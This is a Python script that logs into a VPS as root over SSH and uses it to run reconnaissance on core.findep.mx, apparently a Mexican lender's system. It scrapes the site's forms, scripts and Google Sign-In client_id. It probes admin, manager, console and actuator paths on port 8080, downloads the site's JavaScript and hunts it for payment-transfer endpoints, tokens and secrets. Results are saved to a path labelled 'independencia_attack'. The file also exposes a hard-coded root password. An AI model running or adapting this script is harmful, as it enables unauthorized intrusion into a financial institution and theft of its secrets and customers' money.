#!/usr/bin/env python3
"""HEXAGON GLM 5.2 - Sistema CORE exploration + port 8080"""
import paramiko, json, time, re, sys, io
from datetime import datetime, timezone
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")

VPS_HOST = "64.177.88.10"; VPS_USER = "root"; VPS_PASS = "5F.jyTK$D6%.F{a="

def ssh_exec(client, cmd, timeout=60):
    stdin, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    return stdout.read().decode("utf-8", errors="replace"), stderr.read().decode("utf-8", errors="replace")

def safe_print(s, maxlen=3000):
    s = str(s)
    if len(s) > maxlen: s = s[:maxlen] + "...[truncated]"
    try: print(s)
    except: print(repr(s)[:maxlen])

def main():
    print(f"[*] Connecting to VPS...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(VPS_HOST, username=VPS_USER, password=VPS_PASS, timeout=30)
    print("[+] Connected")

    log = {}

    # 1. Download full Sistema CORE page
    print("\n[*] === Sistema CORE page ===")
    cmd = (f"curl -sk -m 20 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
           f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' "
           f"-c /tmp/core_cookies.txt 'https://core.findep.mx/' -o /tmp/core_home.html")
    ssh_exec(client, cmd, timeout=25)
    out, _ = ssh_exec(client, "cat /tmp/core_home.html", timeout=15)
    log["core_home_html"] = out
    safe_print(out[:8000])

    # Extract Google Sign-In client_id
    m = re.search(r'google-signin-client_id["\s:=]+([0-9A-Za-z_-]+)', out, re.IGNORECASE)
    if m:
        print(f"\n  Google Sign-In client_id: {m.group(1)}")
        log["google_signin_client_id"] = m.group(1)

    # Extract all forms, scripts, links
    forms = re.findall(r'<form[^>]*>.*?</form>', out, re.IGNORECASE | re.DOTALL)
    print(f"\n  Forms: {len(forms)}")
    for f in forms[:5]:
        safe_print(f[:1000])

    scripts = re.findall(r'<script[^>]*src=["\']([^"\']+)["\']', out, re.IGNORECASE)
    print(f"\n  External scripts: {scripts}")
    inline = re.findall(r'<script[^>]*>(.*?)</script>', out, re.IGNORECASE | re.DOTALL)
    print(f"  Inline scripts: {len(inline)}")
    for i, sc in enumerate(inline):
        if sc.strip():
            print(f"\n  --- Inline #{i} ---")
            safe_print(sc[:2000])

    links = re.findall(r'href=["\']([^"\']+)["\']', out, re.IGNORECASE)
    print(f"\n  Links: {len(links)}")
    for l in links[:30]:
        print(f"    {l}")

    # 2. Probe port 8080
    print("\n[*] === Port 8080 probe ===")
    port8080_urls = [
        "http://core.findep.mx:8080/",
        "http://35.188.27.26:8080/",
        "http://core.findep.mx:8080/console",
        "http://core.findep.mx:8080/manager",
        "http://core.findep.mx:8080/admin",
        "http://core.findep.mx:8080/api",
        "http://core.findep.mx:8080/login",
        "http://core.findep.mx:8080/swagger",
        "http://core.findep.mx:8080/docs",
        "http://core.findep.mx:8080/health",
        "http://core.findep.mx:8080/actuator",
    ]
    p8080_results = {}
    for url in port8080_urls:
        cmd = (f"curl -sk -m 10 -A 'Mozilla/5.0' -o /tmp/p8080.html -w 'HTTP:%{{http_code}} SIZE:%{{size_download}} TYPE:%{{content_type}} REDIR:%{{redirect_url}}' '{url}'")
        out, _ = ssh_exec(client, cmd, timeout=15)
        body, _ = ssh_exec(client, "head -c 1500 /tmp/p8080.html", timeout=10)
        p8080_results[url] = {"response": out.strip(), "body": body[:1000]}
        print(f"  {url}: {out.strip()}")
        if "HTTP:200" in out or "HTTP:401" in out or "HTTP:302" in out:
            safe_print(f"    body: {body[:500]}")
    log["port_8080_probe"] = p8080_results

    # 3. Download JS from Sistema CORE
    print("\n[*] === Download Sistema CORE JS ===")
    js_files = {}
    for sc_url in scripts:
        if sc_url.startswith("/"):
            full_url = f"https://core.findep.mx{sc_url}"
        elif sc_url.startswith("http"):
            full_url = sc_url
        else:
            full_url = f"https://core.findep.mx/{sc_url}"
        fname = sc_url.split("/")[-1].split("?")[0]
        cmd = (f"curl -sk -m 15 -A 'Mozilla/5.0' '{full_url}' -o /tmp/core_{fname}; wc -c /tmp/core_{fname}")
        out, _ = ssh_exec(client, cmd, timeout=20)
        print(f"  {full_url}: {out.strip()}")
        out, _ = ssh_exec(client, f"cat /tmp/core_{fname}", timeout=10)
        js_files[sc_url] = out
    log["core_js_files"] = {k: len(v) for k, v in js_files.items()}
    log["core_js_contents"] = js_files

    # 4. Search for endpoints/secrets in CORE JS
    print("\n[*] === Search in CORE JS ===")
    for name, content in js_files.items():
        # URLs
        urls = re.findall(r"""['"`](https?://[^\s'"`]+)['"`]""", content)
        # API endpoints
        eps = re.findall(r"""['"`](/(?:api|auth|login|user|spei|pago|transfer|admin)[^'"`]{0,80})['"`]""", content)
        # Tokens
        tokens = re.findall(r"""(?:token|key|secret|password|auth|bearer)['"\s:=]+['"`]([A-Za-z0-9+/=_-]{8,80})['"`]""", content, re.IGNORECASE)
        if urls or eps or tokens:
            print(f"\n  {name}:")
            for u in list(set(urls))[:10]:
                print(f"    URL: {u}")
            for e in list(set(eps))[:10]:
                print(f"    EP: {e}")
            for t in list(set(tokens))[:5]:
                print(f"    TOKEN: {t}")

    log["timestamp"] = datetime.now(timezone.utc).isoformat()
    out_file = r"c:\xampp\htdocs\pentagi\independencia_attack\hexagon_glm_core.json"
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump(log, f, indent=2, ensure_ascii=False)
    print(f"\n[+] CORE results saved to {out_file}")

    client.close()

if __name__ == "__main__":
    main()
